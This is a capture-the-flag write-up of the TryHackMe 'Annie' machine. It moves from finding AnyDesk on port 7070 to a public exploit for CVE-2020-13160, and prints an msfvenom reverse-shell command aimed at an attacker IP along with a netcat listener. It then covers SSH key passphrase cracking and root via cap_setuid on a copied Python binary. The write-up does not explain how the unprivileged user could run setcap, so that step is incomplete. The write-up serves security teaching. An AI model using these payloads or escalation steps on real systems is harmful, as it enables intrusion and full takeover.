# 🖥️ TryHackMe: Annie

> **Difficulty:** Medium
> **Operating System:** Linux
> **Platform:** TryHackMe
> **Focus Areas:** Network Enumeration, AnyDesk Service Identification, Public Exploit Analysis, Remote Code Execution, SSH Key Cracking, Linux Capabilities & Privilege Escalation

---

## 📌 Overview

In this write-up, we solve the **Annie** Linux machine on TryHackMe.

The machine exposes an unusual service on port `7070`, which is identified through its SSL certificate as an **AnyDesk** service. After researching the available attack paths and analyzing a public exploit, we adapt the exploit payload to obtain initial access as the `annie` user.

From there, we enumerate the system, recover an encrypted SSH private key, crack its passphrase, and continue privilege escalation using a misconfigured Linux capability on a copied Python binary.

The complete attack path is:

```text
Nmap Enumeration
      ↓
Port 7070 Discovery
      ↓
AnyDesk SSL Certificate Identification
      ↓
Public AnyDesk Exploit Analysis
      ↓
Payload Modification
      ↓
Remote Code Execution
      ↓
Reverse Shell as annie
      ↓
User Flag
      ↓
SSH Private Key Discovery
      ↓
Private Key Passphrase Cracking
      ↓
System Enumeration with LinPEAS
      ↓
Python Capability Abuse
      ↓
Root Shell
      ↓
Root Flag
```

---

# 🔍 1. Initial Enumeration

We begin with a full TCP port scan against the target.

```bash
nmap -p- <TARGET-IP>
```

The scan revealed three open ports:

```text
22/tcp    open  ssh
7070/tcp  open  realserver
46707/tcp open  unknown
```

Next, we performed service and version detection:

```bash
nmap -sC -sV -p 22,7070,46707 <TARGET-IP>
```

The scan identified the following services:

```text
22/tcp    open   ssh
7070/tcp  open   ssl/realserver?
46707/tcp closed unknown
```

SSH was running:

```text
OpenSSH 7.6p1 Ubuntu 4ubuntu0.6
```

The most interesting service was running on port `7070`.

---

# 🔐 2. Identifying the Service on Port 7070

Although Nmap initially identified port `7070` as:

```text
ssl/realserver?
```

the SSL certificate provided a much more useful clue:

```text
Subject: commonName=AnyDesk Client
Issuer: commonName=AnyDesk Client
```

This strongly indicated that the service was associated with **AnyDesk**.

The certificate information included:

```text
Public Key type: rsa
Public Key bits: 2048
Signature Algorithm: sha256WithRSAEncryption
```

This discovery changed the direction of our enumeration. Instead of treating port `7070` as a generic unknown service, we focused on publicly known vulnerabilities and exploits affecting AnyDesk.

---

# 🔎 3. Researching the AnyDesk Attack Surface

During research, one potential vulnerability identified was:

```text
CVE-2025-27918
```

This vulnerability concerns an integer overflow condition affecting AnyDesk, potentially leading to a heap-based buffer overflow during processing related to identity images and connection establishment.

However, another publicly available exploit appeared to provide a more relevant attack path for this machine.

Using SearchSploit:

```bash
searchsploit AnyDesk
```

we identified:

```text
AnyDesk 5.5.2 - Remote Code Execution
```

The exploit details were:

```text
Exploit: AnyDesk 5.5.2 - Remote Code Execution
Path: /usr/share/exploitdb/exploits/linux/remote/49613.py
Codes: CVE-2020-13160
Verified: True
```

We copied the exploit locally for analysis:

```bash
searchsploit -m 49613
```

The exploit was copied as:

```text
49613.py
```

Since the exact AnyDesk version running on the target was not directly confirmed, blindly executing the public exploit was not ideal. Instead, the exploit code and its payload handling were examined and adapted to the target environment.

---

# 💥 4. Generating a Reverse Shell Payload

To prepare a payload for the exploit, a Linux x64 reverse shell was generated.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER-IP> LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
```

The payload was generated in Python format:

```python
shellcode = b""
shellcode += b"..."
```

The important part of the process was replacing the original exploit shellcode with a payload configured for our attacking machine.

The callback IP address and port were updated to match our listener.

After adapting the shellcode and using the exploit logic against the target, we prepared to receive the connection.

---

# 🎯 5. Initial Access

A Netcat listener was started:

```bash
nc -lvnp 4444
```

The target successfully connected back:

```text
connect to [ATTACKER-IP] from (UNKNOWN) [TARGET-IP]
```

We checked our current privileges:

```bash
id
```

Output:

```text
uid=1000(annie) gid=1000(annie)
groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

We had successfully obtained an initial shell as:

```text
annie
```

---

# 🖥️ 6. Shell Stabilization

The initial reverse shell did not have a fully interactive terminal.

We used Python to spawn a proper Bash shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Next, we backgrounded the shell:

```text
CTRL + Z
```

On the attacking machine:

```bash
stty raw -echo
fg
```

Finally, we configured the terminal type:

```bash
export TERM=xterm-256color
```

The shell was now stabilized:

```text
annie@desktop:/home/annie$
```

---

# 🚩 7. User Flag

After obtaining access as `annie`, we read the user flag:

```bash
cat user.txt
```

✅ **User flag obtained!**

With the initial objective complete, we moved on to privilege escalation.

---

# 🔼 8. Privilege Escalation Enumeration

We continued with local enumeration to identify possible escalation vectors.

An SSH private key was discovered inside the user's `.ssh` directory:

```text
id_rsa
```

The private key was protected with a passphrase, so it was converted into a format suitable for password cracking.

After extracting the hash, we used John the Ripper:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

John successfully recovered the passphrase:

```text
annie123
```

The result showed:

```text
annie123 (id_rsa)
```

At this stage, we had successfully cracked the passphrase protecting the discovered SSH private key.

---

# 🔑 9. SSH Key Access

Using the recovered passphrase, we were able to authenticate using the discovered SSH private key.

This gave us continued access to the machine through the AnyDesk-related user context and allowed us to proceed with further system enumeration.

The next step was to identify a reliable privilege escalation path.

---

# 🕵️ 10. LinPEAS Enumeration

We transferred and executed **LinPEAS** to enumerate the system for common privilege escalation opportunities.

During enumeration, several container and namespace-related tools were identified:

```text
/sbin/apparmor_parser
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
/sbin/capsh
/sbin/setcap
/sbin/getcap
```

We continued checking for misconfigured capabilities and binaries that could be abused to elevate privileges.

This eventually led to a Python capability-based privilege escalation path.

---

# ⚙️ 11. Abusing Linux Capabilities

A copy of the Python binary was placed inside the user's home directory:

```bash
cp /usr/bin/python3 /home/annie/python3
```

A capability allowing UID manipulation was assigned to the copied binary:

```bash
setcap cap_setuid+ep /home/annie/python3
```

The capability configuration allowed the Python binary to perform `setuid(0)`.

We then executed:

```bash
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

The command successfully spawned a shell with UID `0`.

We were now:

```text
root@desktop:~#
```

🎉 **Privilege escalation successful!**

---

# 🏁 12. Root Flag

After obtaining root access, we verified access to the root flag:

```bash
wc /root/root.txt
```

Output:

```text
1 1 26 /root/root.txt
```

The final flag could then be read with:

```bash
cat /root/root.txt
```

🚩 **Root flag obtained!**

---

# 🧭 Complete Attack Path

```text
                    ┌─────────────────────┐
                    │     Nmap Scan       │
                    │ 22 / 7070 / 46707   │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ SSL Certificate     │
                    │ AnyDesk Discovery   │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Exploit Research    │
                    │ CVE-2020-13160      │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Exploit Analysis &  │
                    │ Payload Modification│
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Reverse Shell       │
                    │ annie               │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │     user.txt        │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ SSH Private Key     │
                    │ Discovery           │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Passphrase Cracking │
                    │ annie123            │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ LinPEAS Enumeration │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Linux Capability    │
                    │ cap_setuid Abuse    │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │     Root Shell      │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │     root.txt        │
                    └─────────────────────┘
```

---

# 🛠️ Tools Used

| Tool              | Purpose                                   |
| ----------------- | ----------------------------------------- |
| `Nmap`            | Port scanning and service enumeration     |
| `SearchSploit`    | Searching for public exploits             |
| `Exploit-DB`      | Public exploit research                   |
| `MSFVenom`        | Reverse shell payload generation          |
| `Netcat`          | Reverse shell listener                    |
| `Python`          | Shell stabilization and capability abuse  |
| `John the Ripper` | SSH private key passphrase cracking       |
| `LinPEAS`         | Local privilege escalation enumeration    |
| `setcap`          | Assigning and managing Linux capabilities |

---

# 📚 Key Takeaways

* Full port scanning is essential because unusual services may expose unexpected attack surfaces.
* SSL certificates can reveal valuable service and product information even when Nmap cannot accurately identify the protocol.
* Public exploits should be analyzed before execution, especially when the exact target version is unknown.
* Payloads often need to be adapted to match the attacker's listener configuration.
* Always stabilize a reverse shell before performing extensive enumeration.
* SSH private keys should be protected with strong passphrases.
* Weak private key passphrases can be cracked through dictionary attacks.
* Local enumeration tools such as LinPEAS can help identify privilege escalation opportunities.
* Linux capabilities can be as dangerous as SUID binaries when they are incorrectly assigned.
* `cap_setuid` is particularly powerful because it can allow a process to change its effective UID to `0`.
* Always review copied or custom binaries for dangerous capabilities.

---

## ⚠️ Disclaimer

> This write-up was created solely for educational purposes and documents actions performed against an authorized TryHackMe lab machine.
>
> Do not use these techniques against systems without explicit permission.

---

### 👤 Author

**Kabir**
Cybersecurity | Red Teaming | Linux Privilege Escalation | CTF Player

⭐ If you found this write-up useful, consider giving the repository a **star**!
